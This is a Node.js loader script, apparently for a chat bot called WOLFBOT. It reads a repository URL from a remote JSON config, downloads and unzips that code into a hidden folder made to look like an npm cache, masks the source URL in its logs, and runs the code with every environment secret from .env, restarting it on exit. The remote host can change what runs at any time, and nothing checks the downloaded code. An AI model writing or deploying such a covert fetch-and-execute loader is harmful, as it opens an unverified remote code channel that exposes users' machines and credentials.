import fs from 'fs';
import path from 'path';
import axios from 'axios';
import AdmZip from 'adm-zip';
import { spawn } from 'child_process';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname  = path.dirname(__filename);

// === TEMP PATH ===
const TEMP_DIR   = path.join(__dirname, '.npm', 'xcache', 'core_bundle');
const EXTRACT_DIR = path.join(TEMP_DIR, 'core');

// === CONFIG ===
const CONFIG_URL      = 'https://7-w.vercel.app/wolf.json';
const LOCAL_SETTINGS  = path.join(__dirname, 'settings.js');
const EXTRACTED_SETTINGS = path.join(EXTRACT_DIR, 'settings.js');
const ENV_FILE        = path.join(__dirname, '.env');

const delay = (ms) => new Promise((res) => setTimeout(res, ms));

const C  = '\x1b[36m';
const R  = '\x1b[0m';
const RD = '\x1b[31m';
const YL = '\x1b[33m';

function log(msg)  { console.log(`${C}${msg}${R}`); }
function err(msg)  { console.error(`${RD}${msg}${R}`); }
function warn(msg) { console.log(`${YL}${msg}${R}`); }

log(`
╔══════════════════════════════════════════════════════════╗
║     🐺 SILENT WOLF LOADER - WOLFBOT v1.1.5               ║
╚══════════════════════════════════════════════════════════╝`);

// === ENV LOADING ===
function loadEnvFile() {
    if (!fs.existsSync(ENV_FILE)) return;
    try {
        for (const line of fs.readFileSync(ENV_FILE, 'utf8').split('\n')) {
            const t = line.trim();
            if (!t || t.startsWith('#')) continue;
            const eq = t.indexOf('=');
            if (eq !== -1) {
                const k = t.substring(0, eq).trim();
                const v = t.substring(eq + 1).trim().replace(/^["']|["']$/g, '');
                if (!process.env[k]) process.env[k] = v;
            }
        }
    } catch {}
}

// === FETCH REPO URL — handles malformed JSON via regex fallback ===
async function fetchRepoUrl() {
    const res = await axios.get(CONFIG_URL, {
        timeout: 15000,
        responseType: 'text',
        headers: { 'User-Agent': 'wolf-fetcher/1.0' }
    });

    const raw = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);

    // Try proper JSON parse first
    try {
        const parsed = JSON.parse(raw);
        const url = parsed?.repo || parsed?.[0]?.repo;
        if (url) return url;
    } catch {}

    // Regex fallback — handles malformed JSON like ["repo":"https://..."]
    const match = raw.match(/"repo"\s*:\s*"([^"]+)"/);
    if (match?.[1]) return match[1];

    throw new Error(`Could not extract repo URL from: ${raw.slice(0, 200)}`);
}

// === DOWNLOAD AND EXTRACT ===
async function downloadAndExtract() {
    if (fs.existsSync(EXTRACT_DIR)) {
        log('✅ Core already extracted, skipping download.');
        return;
    }

    if (fs.existsSync(TEMP_DIR)) {
        fs.rmSync(TEMP_DIR, { recursive: true, force: true });
    }
    fs.mkdirSync(TEMP_DIR, { recursive: true });

    const zipPath = path.join(TEMP_DIR, 'bundle.zip');

    log('⚡ Fetching config from remote...');
    const repoUrl = await fetchRepoUrl();
    log(`📦 Downloading from: ${repoUrl.replace(/github\.com\/[^/]+\/[^/]+/, 'github.com/...')}`);

    const response = await axios({
        url: repoUrl,
        method: 'GET',
        responseType: 'stream',
        timeout: 120000,
        maxRedirects: 10,
        headers: { 'User-Agent': 'wolf-fetcher/1.0' }
    });

    await new Promise((resolve, reject) => {
        const writer = fs.createWriteStream(zipPath);
        response.data.pipe(writer);
        writer.on('finish', resolve);
        writer.on('error', reject);
    });

    const stat = fs.statSync(zipPath);
    if (stat.size < 1000) {
        const preview = fs.readFileSync(zipPath, 'utf8').slice(0, 300);
        throw new Error(`Downloaded file is too small (${stat.size} bytes). Possibly a 404 or login page:\n${preview}`);
    }

    log('📂 Extracting...');
    try {
        const zip = new AdmZip(zipPath);
        zip.extractAllTo(TEMP_DIR, true);
    } finally {
        if (fs.existsSync(zipPath)) fs.unlinkSync(zipPath);
    }

    // Rename extracted folder to "core"
    const items = fs.readdirSync(TEMP_DIR).filter(f =>
        fs.statSync(path.join(TEMP_DIR, f)).isDirectory() && f !== 'core'
    );
    if (items.length > 0) {
        fs.renameSync(path.join(TEMP_DIR, items[0]), EXTRACT_DIR);
    }

    if (!fs.existsSync(EXTRACT_DIR)) {
        throw new Error('Extraction completed but core directory not found.');
    }

    log('✅ Core extracted successfully!');
}

async function applyLocalSettings() {
    if (!fs.existsSync(LOCAL_SETTINGS)) return;
    try {
        fs.mkdirSync(EXTRACT_DIR, { recursive: true });
        fs.copyFileSync(LOCAL_SETTINGS, EXTRACTED_SETTINGS);
    } catch {}
    await delay(300);
}

// === START BOT ===
function startBot() {
    let botDir = fs.existsSync(EXTRACT_DIR) ? EXTRACT_DIR : null;

    if (!botDir) {
        for (const dir of [path.join(__dirname, 'core'), path.join(__dirname, 'bot'), path.join(__dirname, 'src')]) {
            if (fs.existsSync(dir) && fs.existsSync(path.join(dir, 'index.js'))) {
                botDir = dir;
                break;
            }
        }
    }

    if (!botDir) {
        err('❌ No bot directory found. Cannot start bot.');
        err('   Make sure the download succeeded or place the bot files in a "core" folder.');
        process.exit(1);
    }

    let mainFile = 'index.js';
    for (const file of ['index.js', 'main.js', 'bot.js', 'app.js']) {
        if (fs.existsSync(path.join(botDir, file))) { mainFile = file; break; }
    }

    log(`🚀 Starting bot: ${path.join(botDir, mainFile)}`);

    const bot = spawn('node', [mainFile], {
        cwd:   botDir,
        stdio: 'inherit',
        env:   { ...process.env }
    });

    bot.on('close', (code) => {
        if (code !== 0 && code !== null) {
            warn(`⚠️ Bot exited with code ${code}. Restarting in 3s...`);
            setTimeout(() => startBot(), 3000);
        }
    });

    bot.on('error', (e) => {
        err(`❌ Failed to start bot: ${e.message}`);
        setTimeout(() => startBot(), 3000);
    });
}

// === RUN ===
(async () => {
    loadEnvFile();
    try {
        await downloadAndExtract();
        await applyLocalSettings();
    } catch (e) {
        err(`❌ Download/extract failed: ${e.message}`);
        err('   Will attempt to start bot from existing files...');
    }
    startBot();
})();
